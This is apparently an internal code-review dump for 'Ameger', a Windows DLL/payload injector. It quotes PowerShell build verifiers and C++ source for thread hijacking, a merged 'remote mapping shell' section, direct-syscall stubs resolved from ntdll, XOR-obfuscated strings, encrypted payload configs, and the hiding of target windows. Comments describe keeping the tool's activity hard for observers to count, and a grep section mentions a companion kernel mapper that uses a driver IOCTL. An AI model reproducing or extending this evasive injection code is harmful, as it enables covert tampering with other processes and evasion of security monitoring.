    if ($nsec -le 0 -or $nsec -gt 96) { Write-Fail "Bad Section Count"; exit 1 }
    if ([BitConverter]::ToUInt16($data, $opt) -ne 0x20B) { Write-Fail "Not PE32+"; exit 1 }

    $secBase = $opt + $optSize
    $names = New-Object System.Collections.ArrayList
    $chars = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $nsec; $i++) {
        $o = $secBase + (40 * $i)
        $name = ""
        for ($k = 0; $k -lt 8; $k++) {
            $c = $data[$o + $k]
            if ($c -eq 0) { break }
            $name += [char]$c
        }
        [void]$names.Add($name)
        [void]$chars.Add([PSCustomObject]@{ Index = $i; Name = $name; Offset = $o })
    }


    # ".code" is five characters, so the linker emits it verbatim in the 8-byte section-name
    # field. A section literally named ".code$xx" means the per-part code_seg attributes failed
    # to merge.
    $mmapExact = @($chars | Where-Object { $_.Name -eq ".code" })

    $dollarParts = @($chars | Where-Object { $_.Name -match "\`$" })

    if ($mmapExact.Count -eq 0) {
        Write-Fail "No .code Section Present At All; The Remote Shell Was Not Emitted"
        Write-Host ("      Sections: " + ($names -join ", "))
        exit 1
    }

    $mergedCount = $mmapExact.Count
    if ($mergedCount -ne 1) {
        Write-Fail ("Expected Exactly One Merged .code Section, Found " + $mergedCount)
        exit 1
    }

    if ($dollarParts.Count -ne 0) {
        Write-Fail ("Per-Part code_seg Sections With A `$ Discriminator Survived The Link (" + $dollarParts.Count + ")")
        Write-Host ("      Found: " + (($dollarParts | ForEach-Object { $_.Name }) -join ", "))
        exit 1
    }

    Write-Ok ("Remote Mapping Shell Is A Single Merged Section (" + $mmapExact[0].Name + ")")


    $entry = $mmapExact[0]
    $characteristics = [BitConverter]::ToUInt32($data, $entry.Offset + 36)
    if (($characteristics -band 0x20000000) -eq 0) {
        Write-Fail "Merged .code Section Is Not Executable"
        exit 1
    }
    if (($characteristics -band 0x80000000) -ne 0) {
        Write-Fail "Merged .code Section Is Writable; W^X Regression In The Staged Image"
        exit 1
    }
    Write-Ok ("Merged Shell Section Is Execute+Read (Characteristics 0x" + $characteristics.ToString("X8") + ")")
}

exit 0
```

File: `Build/Scripts/VerifyEmbedMagic.ps1`, full file, lines 1-238.

```powershell
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Embed", "Magic", "PayloadHash", "DeployedPin", "ConfigKeys")]
    [string]$Check,

    [Parameter(Mandatory = $true)]
    [string]$Path,

    [string]$Words,

    [string]$Magic,

    [string]$Config,

    [string]$ExpectPin
)

$ErrorActionPreference = "Stop"

$script:UseColor = -not [Console]::IsOutputRedirected
$script:Esc = [char]27
$script:C_Green = "$($script:Esc)[92m"
$script:C_Red = "$($script:Esc)[91m"
$script:C_Dim = "$($script:Esc)[90m"
$script:C_Reset = "$($script:Esc)[0m"

function Get-Painted([string]$Color, [string]$Text) {
    if (-not $script:UseColor) { return $Text }
    return ($Color + $Text + $script:C_Reset)
}

function Write-Ok([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Green "OK") + " " + $Text)
}

function Write-Fail([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Red "[x]") + " " + $Text)
}

if (-not (Test-Path -LiteralPath $Path)) {
    Write-Fail ("Not Found: " + $Path)
    exit 1
}

$data = [IO.File]::ReadAllBytes($Path)

if ($Check -eq "Embed") {
    $wordList = @()
    if (-not [string]::IsNullOrWhiteSpace($Words)) { $wordList = $Words -split ',' }
    if ($wordList.Count -ne 8) {
        Write-Fail ("Expected 8 Runtime Hash Words, Got " + $wordList.Count)
        exit 1
    }

    $pos = 0
    $last = $data.Length - 4
    for ($i = 0; $i -lt $wordList.Count; $i++) {
        $w = [string]$wordList[$i]
        if ($w.StartsWith("0x") -or $w.StartsWith("0X")) { $w = $w.Substring(2) }
        $val = [Convert]::ToUInt32($w, 16)
        $b = [BitConverter]::GetBytes([uint32]$val)

        $found = -1
        for ($j = $pos; $j -le $last; $j++) {
            if ($data[$j] -eq $b[0] -and $data[$j + 1] -eq $b[1] -and
                $data[$j + 2] -eq $b[2] -and $data[$j + 3] -eq $b[3]) {
                $found = $j
                break
            }
        }
        if ($found -lt 0) {
            Write-Fail ("Runtime Hash Word " + $i + " Not Found In Order: " + (Get-Painted $script:C_Dim $Path))
            exit 1
        }
        $pos = $found + 4
    }

    Write-Ok ("Embedded Runtime Hash: " + (Get-Painted $script:C_Green "8") + "/" + (Get-Painted $script:C_Green "8") + " Dwords In Order (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "PayloadHash") {
    if ([string]::IsNullOrEmpty($Config)) {
        Write-Fail "Expected A Master Config Path"
        exit 1
    }
    if (-not (Test-Path -LiteralPath $Config)) {
        Write-Fail ("Master Config Not Found: " + (Get-Painted $script:C_Dim $Config))
        exit 1
    }

    $pin = $null
    foreach ($line in [IO.File]::ReadAllLines($Config)) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        if ($trimmed.Substring(0, $eq).Trim() -ieq "PayloadSha256") {
            $pin = $trimmed.Substring($eq + 1).Trim()
            break
        }
    }
    if ([string]::IsNullOrEmpty($pin)) {
        Write-Fail ("PayloadSha256 Pin Missing In " + (Get-Painted $script:C_Dim $Config))
        exit 1
    }

    $actual = ([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($data)) -replace "-", "")
    if ($actual -ine $pin) {
        Write-Fail ("Payload Hash Mismatch: Expected " + $pin + ", Got " + $actual + " (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    Write-Ok ("Payload SHA-256 = " + (Get-Painted $script:C_Green $actual) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "DeployedPin") {
    if ([string]::IsNullOrEmpty($ExpectPin)) {
        Write-Fail "Expected A Payload SHA-256"
        exit 1
    }
    if ([string]::IsNullOrEmpty($Magic)) {
        Write-Fail "Expected A Config Magic"
        exit 1
    }

    $magicBytes = [Text.Encoding]::ASCII.GetBytes($Magic)
    $isEncrypted = $false
    if ($data.Length -gt $magicBytes.Length) {
        $isEncrypted = $true
        for ($i = 0; $i -lt $magicBytes.Length; $i++) {
            if ($data[$i] -ne $magicBytes[$i]) { $isEncrypted = $false; break }
        }
    }
    if ($isEncrypted) {
        Add-Type -AssemblyName System.Security | Out-Null
        try {
            $blob = New-Object byte[] ($data.Length - $magicBytes.Length)
            [Array]::Copy($data, $magicBytes.Length, $blob, 0, $blob.Length)
            $plainBytes = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {
            Write-Fail ("DPAPI Decrypt Failed: " + $_.Exception.Message)
            exit 1
        }
        $text = [Text.Encoding]::UTF8.GetString($plainBytes)
    } else {
        $text = [Text.Encoding]::UTF8.GetString($data)
    }

    $pin = $null
    foreach ($line in ($text -split "\r?\n")) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        if ($trimmed.Substring(0, $eq).Trim() -ieq "PayloadSha256") {
            $pin = $trimmed.Substring($eq + 1).Trim()
            break
        }
    }
    if ([string]::IsNullOrEmpty($pin)) {
        Write-Fail ("Deployed Config Pins No PayloadSha256 (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    if ($pin -ine $ExpectPin) {
        Write-Fail ("Deployed Config Pin Mismatch: Config Pins " + $pin + ", Deployed Payload Is " + $ExpectPin + " (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    Write-Ok ("Deployed Config Pin = " + (Get-Painted $script:C_Green $pin) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "ConfigKeys") {
    if ([string]::IsNullOrEmpty($Magic)) {
        Write-Fail "Expected A Config Magic"
        exit 1
    }

    $magicBytes = [Text.Encoding]::ASCII.GetBytes($Magic)
    $isEncrypted = $false
    if ($data.Length -gt $magicBytes.Length) {
        $isEncrypted = $true
        for ($i = 0; $i -lt $magicBytes.Length; $i++) {
            if ($data[$i] -ne $magicBytes[$i]) { $isEncrypted = $false; break }
        }
    }
    if ($isEncrypted) {
        Add-Type -AssemblyName System.Security | Out-Null
        try {
            $blob = New-Object byte[] ($data.Length - $magicBytes.Length)
            [Array]::Copy($data, $magicBytes.Length, $blob, 0, $blob.Length)
            $plainBytes = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {
            Write-Fail ("DPAPI Decrypt Failed: " + $_.Exception.Message)
            exit 1
        }
        $text = [Text.Encoding]::UTF8.GetString($plainBytes)
    } else {
        $text = [Text.Encoding]::UTF8.GetString($data)
    }

    $present = @{}
    foreach ($line in ($text -split "\r?\n")) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        $k = $trimmed.Substring(0, $eq).Trim()
        $v = $trimmed.Substring($eq + 1).Trim()
        if ($k -ieq "PayloadName" -or $k -ieq "RuntimeName" -or $k -ieq "ExportMap" -or $k -ieq "DllDir") { $present[$k] = $v }
    }
    foreach ($k in @("PayloadName", "RuntimeName", "ExportMap", "DllDir")) {
        if (-not $present.ContainsKey($k) -or [string]::IsNullOrEmpty($present[$k])) {
            Write-Fail ("Deployed Config Is Missing Required Key: " + $k + " (" + (Get-Painted $script:C_Dim $Path) + ")")
            exit 1
        }
    }
    Write-Ok ("Deployed Config Carries Per-Build Keys: PayloadName, RuntimeName, ExportMap, DllDir (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ([string]::IsNullOrEmpty($Magic)) {
    Write-Fail "Expected A Config Magic String"
    exit 1
}
$expected = [Text.Encoding]::ASCII.GetBytes($Magic)
if ($data.Length -lt $expected.Length) {
    Write-Fail ("Encrypted Config Magic '" + $Magic + "' Missing: " + (Get-Painted $script:C_Dim $Path))
    exit 1
}
for ($i = 0; $i -lt $expected.Length; $i++) {
    if ($data[$i] -ne $expected[$i]) {
        Write-Fail ("Encrypted Config Magic '" + $Magic + "' Missing: " + (Get-Painted $script:C_Dim $Path))
        exit 1
    }
}
Write-Ok ("Encrypted Config Magic = " + (Get-Painted $script:C_Green $Magic) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
exit 0
```

## R7 — Scratch alphabet invariant (P2)

File: `Ameger/Core/Utility/Tools/Tools.cpp`
Range: lines 200-289, covering `GetSymbolCacheRoot` and the referenced `kAlphabet` table at line 239.

```cpp
	auto pos = temp.find_last_of('\\');
	if (pos == std::wstring::npos)
	{
		return false;
	}

	out = temp.substr(0, pos + 1);

	return true;
}

bool GetSymbolCacheRoot(std::wstring & out)
{
	out.clear();

	wchar_t local_app_data[MAX_PATH]{ 0 };
	DWORD length = GetEnvironmentVariableW(XOR_STR_W(L"LOCALAPPDATA").get(), local_app_data, MAX_PATH);
	if (!length || length >= MAX_PATH)
	{

		length = GetTempPathW(MAX_PATH, local_app_data);
		if (!length || length >= MAX_PATH)
		{
			return false;
		}
	}

	std::wstring root(local_app_data, length);
	if (root.back() != L'\\')
	{
		root += L'\\';
	}

	// The alphabet is a NUL-terminated literal, so _countof counts the
	// terminator. The terminator must never be selected: an embedded NUL in
	// the leaf would make the directory that is created (which stops at the
	// NUL) shorter than the string that is remembered, and the ownership
	// check that gates deletion would then reject the leaf and leak the
	// directory.
	static const wchar_t kAlphabet[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	constexpr size_t kAlphabetChars = _countof(kAlphabet) - 1;
	static_assert(kAlphabetChars == 62, "the scratch alphabet must stay 62 characters");

	unsigned char pick[10]{ 0 };
	if (!BCRYPT_SUCCESS(BCryptGenRandom(nullptr, pick, sizeof(pick), BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		const ULONGLONG ticks = GetTickCount64();
		for (int i = 0; i < 10; ++i)
		{
			pick[i] = static_cast<unsigned char>((ticks >> (i * 5)) ^ (static_cast<ULONGLONG>(i) * 131ull) ^ (reinterpret_cast<ULONG_PTR>(&pick) >> 16));
		}
	}

	std::wstring leaf;
	leaf.reserve(10);

	leaf += static_cast<wchar_t>('a' + (pick[0] % 26));

	for (int i = 1; i < 10; ++i)
	{
		leaf += kAlphabet[pick[i] % kAlphabetChars];
	}

	leaf += L'\\';
	root += leaf;

	if (!CreateDirectoryW(root.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS)
	{
		return false;
	}

	out = root;

	return true;
}

bool BuildStablePdbCachePath(const std::wstring & pdb_name, const std::wstring & guid_and_age, std::wstring & out)
{
	out.clear();

	if (pdb_name.empty() || guid_and_age.empty())
	{
		return false;
	}

	if (pdb_name.find_first_of(L"\\/:") != std::wstring::npos || pdb_name.find(L"..") != std::wstring::npos ||
		guid_and_age.find_first_of(L"\\/:") != std::wstring::npos || guid_and_age.find(L"..") != std::wstring::npos)
	{
		return false;
	}
```

## R9 — Syscall resolution fragility (P2)

File: `Ameger/Native/Syscall.cpp`, lines 540-650.

```cpp
	*ReCa<void **>(GadgetSlot) = gadget;

	DWORD OldProtect = 0;
	if (!VirtualProtect(Pool, kStubAreaSize + 16, PAGE_EXECUTE_READ, &OldProtect))
	{
		for (size_t i = 0; i < kSyscallTableCount; ++i)
		{
			g_SyscallTable[i].Stub = nullptr;
		}

		VirtualFree(Pool, 0, MEM_RELEASE);
		SC_LOG_ERR("VirtualProtect RX Failed");
		return false;
	}

	g_SyscallPool.store(Pool, std::memory_order_release);

	SC_LOG_OK("Stub Pool Built: %u/%zu Stubs At %p (RX)", Written, kSyscallTableCount, Pool);
	return true;
}

void * SyscallGadgetAddress()
{
	if (!g_SyscallGadget)
	{
		g_SyscallGadget = FindSyscallGadget();
	}

	return g_SyscallGadget;
}

DWORD SyscallResolveAll()
{
	EnsureLock();
	SyscallLockGuard Guard;

	if (g_SyscallPoolReady.load(std::memory_order_acquire))
	{
		DWORD Ready = 0;
		for (size_t i = 0; i < kSyscallTableCount; ++i)
		{
			if (g_SyscallTable[i].Stub)
			{
				++Ready;
			}
		}

		SC_LOG_OK("Syscall Pool Already Ready (%u/%zu Stubs)", Ready, kSyscallTableCount);
		return Ready;
	}

	SC_LOG_INFO("Resolving Syscall Service Numbers From ntdll...");

	auto ntdll_name = XOR_STR_W(L"ntdll.dll");
	const BYTE * Ntdll = ReCa<const BYTE *>(GetModuleHandleW(ntdll_name.get()));
	if (!Ntdll)
	{
		SC_LOG_ERR("ntdll.dll Not Loaded");
		return 0;
	}

	DWORD ImageSize = 0;
	const IMAGE_EXPORT_DIRECTORY * Export = LocateExportDirectory(Ntdll, ImageSize);
	if (!Export)
	{
		SC_LOG_ERR("Failed To Locate ntdll Export Directory");
		return 0;
	}

	SC_LOG_INFO("ntdll Base: %p | ImageSize: 0x%X | Exports: %u", Ntdll, ImageSize, Export->NumberOfNames);
	// The harvest buffer keeps every healthy export that was seen, not just the
	// ones this project cares about. The neighbour interpolation in pass two
	// needs those as reference points.
	std::vector<HARVESTED_ENTRY> HarvestedStorage;
	try
	{
		HarvestedStorage.reserve(512);
	}
	catch (...)
	{
		SC_LOG_ERR("Failed To Reserve Harvest Buffer");
		return 0;
	}
	HARVESTED_ENTRY * Harvested = nullptr;
	DWORD HarvestedCount = 0;
	constexpr DWORD kHarvestedCap = 0x4000;

	const auto * Names		= ReCa<const DWORD *>(Ntdll + Export->AddressOfNames);
	const auto * Ordinals	= ReCa<const WORD *>(Ntdll + Export->AddressOfNameOrdinals);
	const auto * Functions	= ReCa<const DWORD *>(Ntdll + Export->AddressOfFunctions);

	DWORD matched = 0;
	DWORD healthy = 0;
	DWORD rerouted = 0;
	DWORD oob = 0;

	for (DWORD i = 0; i < Export->NumberOfNames; ++i)
	{
		const DWORD NameRva = Names[i];
		if (!NameRva || !BoundedRead(Ntdll, NameRva, 2, ImageSize))
		{
			continue;
		}

		DWORD Hash = 0;
		{
			const DWORD NameLimit = ImageSize > NameRva ? ImageSize - NameRva : 0;
			const char * Name = ReCa<const char *>(Ntdll + NameRva);
			DWORD h = 0x811C9DC5u;
			bool terminated = false;
```

## R10 — Target selection (P2)

File: `Interface/Source/Main.cpp`, lines 4260-4360.

```cpp
        }

        // B4: the thread census is diagnostic-only and every thread it opens
        // is a handle-table entry an onlooker can count. It runs only when
        // the operator asked for a verbose trace or the full census; a quiet
        // run opens no target thread for it at all.
        if (config.verbose_trace || FullThreadCensusEnabled())
        {
            SetEnvironmentVariableW(L"AMEGER_CENSUS", L"1");
        }
        g_DiscardResultLogOnSuccess = config.discard_result_log_on_success;
        g_TestMode = config.test_mode;
        g_AutoConfirm = config.auto_confirm;
        if (config.test_mode)
        {
            // A test run's transcript is the whole point of the run, so it is
            // never removed, and a test run does not stop to ask the operator
            // whether it may begin.
            g_DiscardResultLogOnSuccess = false;
            g_AutoConfirm = true;
        }

        // The scratch target is owned by this guard, so it is closed when the
        // wizard returns.
        ScratchTargetGuard scratch_target;

        // The transcript is current from the moment it is opened, so by the
        // time the wizard finishes it only has to be flushed. It stays open
        // for anything that is printed after this point, either by this
        // function as it unwinds or by the fault handler.
        auto transcript_guard = MakeScopeExit([&]() noexcept
        {
            ameger_ui_log::FlushResultLog();
        });

        Trace::Begin(L"Operator Confirmation");
        // The confirmation itself decides whether it is needed. A test run
        // never waits for an answer, because there is nobody to answer it.
        const ConfirmationResult confirmation = ConfirmBeforeDetection();
        if (confirmation == ConfirmationResult::Cancelled)
        {
            Trace::End();
            LOG(0, L"Cancelled.\n");
            Trace::Summary(L"Cancelled By Operator");
            return 0;
        }
        if (confirmation == ConfirmationResult::Unavailable)
        {
            Trace::End();
            Trace::Summary(L"Failed At Operator Confirmation");
            return 1;
        }
        Trace::End();

        Trace::Begin(L"Select Target Process");
        TargetSelection target;
        bool cancelled = false;
        if (config.test_mode)
        {
            // A scratch target is started here when the operator has none
            // open, so the run does not sit waiting for one to appear.
            DWORD scratch_pid = 0;
            if (scratch_target.StartIfAbsent(config.target_name, scratch_pid))
            {
                Trace::Note(L"A Scratch %ls Was Started (PID %lu); It And Any Instance That Came With It Are Closed When The Run Ends",
                    config.target_name.c_str(), static_cast<unsigned long>(scratch_pid));
            }
            else
            {
                Trace::Note(L"An Existing %ls Was Left Running By The Operator", config.target_name.c_str());
            }
        }
        if (!SelectTarget(config.target_name, target, cancelled, config.timeout))
        {
            Trace::End();
            if (cancelled)
            {
                LOG(0, L"Cancelled.\n");
                Trace::Summary(L"Cancelled By Operator");
                return 0;
            }
            Trace::Summary(L"Failed At Target Selection");
            return 2;
        }
        Trace::Note(L"PID = %lu", target.pid);
        Trace::Note(L"Name = %ls", target.name.c_str());
        Trace::Note(L"Architecture = %ls", ArchitectureName(target.architecture));
        Trace::End();

        if (config.test_mode)
        {
            // A test run puts no window on the operator's desktop. The window
            // belongs to the process that was actually selected, which is not
            // necessarily the one that was started.
            HideProcessWindows(target.pid);
        }

        if (target.architecture == Architecture::X86)
        {
            PrintError(L"x86 Targets Are Not Supported In This x64-Only Build.");
            PauseBeforeExit();
```

## INVARIANTS

File: `Ameger/Injection.h:69`

```cpp
static_assert(sizeof(LAST_ERROR_INFO) % 4 == 0, "LAST_ERROR_INFO must stay 4-byte aligned");
```

File: `Ameger/Execution/ThreadHijacking.cpp:24`

```cpp
static_assert(sizeof(THREAD_EXEC_STATS) % sizeof(LONG) == 0, "THREAD_EXEC_STATS must be a whole number of LONGs");
```

File: `Ameger/Execution/ThreadHijacking.cpp:67-73`

```cpp
static_assert(SR_SHELL_STACK_BASE == kHijackStatePage + kHijackGuardPage,
	"the shell stack must start after the guard page");
static_assert(SR_SHELL_STACK_BASE + SR_SHELL_STACK_SIZE == kHijackStatePage + kHijackGuardPage + kHijackShellStack,
	"the stub shell stack geometry must match the host allocation");
static_assert(SR_SHELL_STACK_TOP + 0x20 <= SR_SHELL_STACK_BASE + SR_SHELL_STACK_SIZE,
	"the stub pivot address must stay inside the shell stack");
static_assert(SR_SHELL_STACK_TOP % 16 == 0,
	"the shell stack top must be 16-byte aligned");
```

File: `Ameger/Execution/Routine/StartRoutine.h:80-91`

```cpp
static_assert(sizeof(SR_REMOTE_DATA) == 96);
static_assert(offsetof(SR_REMOTE_DATA, Ret) == 8);
static_assert(offsetof(SR_REMOTE_DATA, LastWin32Error) == 16);
static_assert(offsetof(SR_REMOTE_DATA, pArg) == 24);
static_assert(offsetof(SR_REMOTE_DATA, pRoutine) == 32);
static_assert(offsetof(SR_REMOTE_DATA, Buffer) == 40);
static_assert(offsetof(SR_REMOTE_DATA, FpFlags) == 48);
static_assert(offsetof(SR_REMOTE_DATA, FpMask) == 56);
static_assert(offsetof(SR_REMOTE_DATA, ShellCw) == 64);
static_assert(offsetof(SR_REMOTE_DATA, ShellMxcsr) == 72);
static_assert(offsetof(SR_REMOTE_DATA, RoutineCyclesDelta) == 80);
static_assert(offsetof(SR_REMOTE_DATA, ShellStackTop) == 88);
```

File: `Ameger/Core/Foundation/Primitives/InjectionTypes.h:45-46`

```cpp
static_assert(sizeof(HijackStats) == 72);
static_assert(offsetof(HijackStats, Attempted) == 0);
```

File: `Ameger/Core/Foundation/Primitives/InjectionTypes.h:82-94`

```cpp
static_assert(sizeof(THREAD_EXEC_STATS) == 104);
static_assert(offsetof(THREAD_EXEC_STATS, Attempted) == 0);
static_assert(offsetof(THREAD_EXEC_STATS, DonorRounds) == 16);
static_assert(offsetof(THREAD_EXEC_STATS, PollIterations) == 40);
static_assert(offsetof(THREAD_EXEC_STATS, RoutineRet) == 48);
static_assert(offsetof(THREAD_EXEC_STATS, OldRip) == 56);
static_assert(offsetof(THREAD_EXEC_STATS, OldRsp) == 64);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackBase) == 72);
static_assert(offsetof(THREAD_EXEC_STATS, FpMode) == 80);
static_assert(offsetof(THREAD_EXEC_STATS, FpMask) == 84);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackSize) == 88);
static_assert(offsetof(THREAD_EXEC_STATS, VictimStackBytes) == 92);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackResumeCount) == 96);
```

File: `Ameger/Core/Foundation/Primitives/InjectionTypes.h:126`

```cpp
static_assert(sizeof(MAP_STATS) == 80);
```

File: `Ameger/Core/Foundation/Primitives/InjectionTypes.h:138`

```cpp
static_assert(sizeof(STRING_STATS) == 24);
```

File: `Ameger/Core/Foundation/Primitives/InjectionTypes.h:218-220`

```cpp
static_assert(sizeof(VERIFIABLE_EXEC_TELEMETRY) == 14 * sizeof(ULONG_PTR) + 26 * sizeof(DWORD),
	"the telemetry block must have no padding, because it is published a word at a time");
static_assert(sizeof(VERIFIABLE_EXEC_TELEMETRY) % sizeof(LONG) == 0,
	"the telemetry block is published a word at a time, so its size must be a whole number of words");
```

File: `Interface/Source/Launcher.h:100-123`

```cpp
static_assert(sizeof(MemoryInjectionData) == sizeof(MEMORY_INJECTIONDATA),
    "MemoryInjectionData must match the runtime's MEMORY_INJECTIONDATA layout");

static_assert(offsetof(MemoryInjectionData, RawData) == offsetof(MEMORY_INJECTIONDATA, RawData),
    "MemoryInjectionData::RawData offset must match MEMORY_INJECTIONDATA::RawData");
static_assert(offsetof(MemoryInjectionData, RawSize) == offsetof(MEMORY_INJECTIONDATA, RawSize),
    "MemoryInjectionData::RawSize offset must match MEMORY_INJECTIONDATA::RawSize");
static_assert(offsetof(MemoryInjectionData, ProcessID) == offsetof(MEMORY_INJECTIONDATA, ProcessID),
    "MemoryInjectionData::ProcessID offset must match MEMORY_INJECTIONDATA::ProcessID");
static_assert(offsetof(MemoryInjectionData, Flags) == offsetof(MEMORY_INJECTIONDATA, Flags),
    "MemoryInjectionData::Flags offset must match MEMORY_INJECTIONDATA::Flags");
static_assert(offsetof(MemoryInjectionData, Timeout) == offsetof(MEMORY_INJECTIONDATA, Timeout),
    "MemoryInjectionData::Timeout offset must match MEMORY_INJECTIONDATA::Timeout");
static_assert(offsetof(MemoryInjectionData, hHandleValue) == offsetof(MEMORY_INJECTIONDATA, hHandleValue),
    "MemoryInjectionData::hHandleValue offset must match MEMORY_INJECTIONDATA::hHandleValue");
static_assert(offsetof(MemoryInjectionData, hDllOut) == offsetof(MEMORY_INJECTIONDATA, hDllOut),
    "MemoryInjectionData::hDllOut offset must match MEMORY_INJECTIONDATA::hDllOut");
static_assert(offsetof(MemoryInjectionData, GenerateErrorLog) == offsetof(MEMORY_INJECTIONDATA, GenerateErrorLog),
    "MemoryInjectionData::GenerateErrorLog offset must match MEMORY_INJECTIONDATA::GenerateErrorLog");
static_assert(offsetof(MemoryInjectionData, TargetTid) == offsetof(MEMORY_INJECTIONDATA, TargetTid),
    "MemoryInjectionData::TargetTid offset must match MEMORY_INJECTIONDATA::TargetTid");
static_assert(offsetof(MemoryInjectionData, hThreadHandleValue) == offsetof(MEMORY_INJECTIONDATA, hThreadHandleValue),
    "MemoryInjectionData::hThreadHandleValue offset must match MEMORY_INJECTIONDATA::hThreadHandleValue");
static_assert(offsetof(MemoryInjectionData, DllPath) == offsetof(MEMORY_INJECTIONDATA, DllPath),
    "MemoryInjectionData::DllPath offset must match MEMORY_INJECTIONDATA::DllPath");
```

File: `Interface/Source/Main.cpp:776-799`

```cpp
    static_assert(sizeof(MemoryInjectionData) == sizeof(MEMORY_INJECTIONDATA),
        "MemoryInjectionData must match the runtime's MEMORY_INJECTIONDATA layout");

    static_assert(offsetof(MemoryInjectionData, RawData) == offsetof(MEMORY_INJECTIONDATA, RawData),
        "MemoryInjectionData::RawData offset must match MEMORY_INJECTIONDATA::RawData");
    static_assert(offsetof(MemoryInjectionData, RawSize) == offsetof(MEMORY_INJECTIONDATA, RawSize),
        "MemoryInjectionData::RawSize offset must match MEMORY_INJECTIONDATA::RawSize");
    static_assert(offsetof(MemoryInjectionData, ProcessID) == offsetof(MEMORY_INJECTIONDATA, ProcessID),
        "MemoryInjectionData::ProcessID offset must match MEMORY_INJECTIONDATA::ProcessID");
    static_assert(offsetof(MemoryInjectionData, Flags) == offsetof(MEMORY_INJECTIONDATA, Flags),
        "MemoryInjectionData::Flags offset must match MEMORY_INJECTIONDATA::Flags");
    static_assert(offsetof(MemoryInjectionData, Timeout) == offsetof(MEMORY_INJECTIONDATA, Timeout),
        "MemoryInjectionData::Timeout offset must match MEMORY_INJECTIONDATA::Timeout");
    static_assert(offsetof(MemoryInjectionData, hHandleValue) == offsetof(MEMORY_INJECTIONDATA, hHandleValue),
        "MemoryInjectionData::hHandleValue offset must match MEMORY_INJECTIONDATA::hHandleValue");
    static_assert(offsetof(MemoryInjectionData, hDllOut) == offsetof(MEMORY_INJECTIONDATA, hDllOut),
        "MemoryInjectionData::hDllOut offset must match MEMORY_INJECTIONDATA::hDllOut");
    static_assert(offsetof(MemoryInjectionData, GenerateErrorLog) == offsetof(MEMORY_INJECTIONDATA, GenerateErrorLog),
        "MemoryInjectionData::GenerateErrorLog offset must match MEMORY_INJECTIONDATA::GenerateErrorLog");
    static_assert(offsetof(MemoryInjectionData, TargetTid) == offsetof(MEMORY_INJECTIONDATA, TargetTid),
        "MemoryInjectionData::TargetTid offset must match MEMORY_INJECTIONDATA::TargetTid");
    static_assert(offsetof(MemoryInjectionData, hThreadHandleValue) == offsetof(MEMORY_INJECTIONDATA, hThreadHandleValue),
        "MemoryInjectionData::hThreadHandleValue offset must match MEMORY_INJECTIONDATA::hThreadHandleValue");
    static_assert(offsetof(MemoryInjectionData, DllPath) == offsetof(MEMORY_INJECTIONDATA, DllPath),

File: `Interface/Source/Main.cpp:2127`

```cpp
    static_assert(sizeof(AMEGER_CONFIG_MAGIC_STR) == kConfigBlobMagicSize + 1, "config magic must be 8 chars");
```

File: `Ameger/NT/NTDefinitions.h:313-322`

```cpp
static_assert(sizeof(CLIENT_ID) == 16);
static_assert(sizeof(UNICODE_STRING) == 16);
static_assert(sizeof(ANSI_STRING) == 16);
static_assert(sizeof(RTL_BALANCED_NODE) == 24);
static_assert(sizeof(RTL_RB_TREE) == 16);
static_assert(sizeof(OBJECT_ATTRIBUTES) == 48);
static_assert(sizeof(PEB_LDR_DATA) == 88);
static_assert(offsetof(PEB_LDR_DATA, InLoadOrderModuleListHead) == 16);
static_assert(offsetof(PEB_LDR_DATA, InMemoryOrderModuleListHead) == 32);
static_assert(offsetof(PEB_LDR_DATA, InInitializationOrderModuleListHead) == 48);
```

File: `Ameger/NT/NTDefinitions.h:429-431`

```cpp
static_assert(sizeof(PEB) == 296);
static_assert(offsetof(PEB, Mutant) == 8);
static_assert(offsetof(PEB, ImageBaseAddress) == 16);
static_assert(offsetof(PEB, Ldr) == 24);
static_assert(offsetof(PEB, ProcessParameters) == 32);
static_assert(offsetof(PEB, ProcessHeap) == 48);
static_assert(offsetof(PEB, CrossProcessFlags) == 80);
```

## GREP-EVIDENCE

### 1. Does the Injector tree reference the Mapper at all?

Pattern: `PdFwKrnl|kCopyIoctl|CopyRequest|Ameger-Mapper|Mapper\.exe|\\\.\\PdFw`
Search paths: `D:\Ameger\Injector\Ameger`, `D:\Ameger\Injector\Interface`, `D:\Ameger\Injector\Build`

Result: no files found in any of those paths.

Analysis: The Injector source tree does not reference the Mapper provider constants, the `PdFwKrnl` device, `kCopyIoctl`, or `CopyRequest`. The Injector therefore does not directly use the Mapper’s provider IOCTL primitive.

### 2. Does the Mapper tree reference the Injector at all?

